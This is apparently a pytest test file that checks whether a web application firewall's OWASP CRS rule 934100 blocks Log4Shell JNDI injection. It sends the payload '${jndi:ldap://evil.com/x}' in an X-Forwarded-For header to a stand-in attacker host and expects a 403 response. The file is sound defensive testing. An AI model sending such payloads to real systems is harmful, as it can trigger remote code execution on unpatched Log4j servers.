"""CRS 934 — Log4Shell / JNDI Injection.

Tests that JNDI lookup payloads (CVE-2021-44228) are blocked by OWASP CRS
rules 934100-934999. These rules detect ${jndi:...} patterns in headers,
query parameters, and request bodies — the attack vector used by Log4Shell
to achieve remote code execution via Java's JNDI naming interface.

Expected triggering rules:
  - 934100: JNDI injection attempt (${jndi:ldap://...})
"""

import pytest


@pytest.mark.attack
@pytest.mark.log4shell
def test_jndi_in_header(gateway_url, browser_session):
    """JNDI lookup string in X-Forwarded-For header — classic Log4Shell vector."""
    resp = browser_session.get(
        f"{gateway_url}/greet",
        params={"name": "test"},
        headers={"X-Forwarded-For": "${jndi:ldap://evil.com/x}"},
        timeout=10,
    )
    assert resp.status_code == 403, (
        f"Log4Shell attack should be blocked (expected 403, got {resp.status_code})"
    )
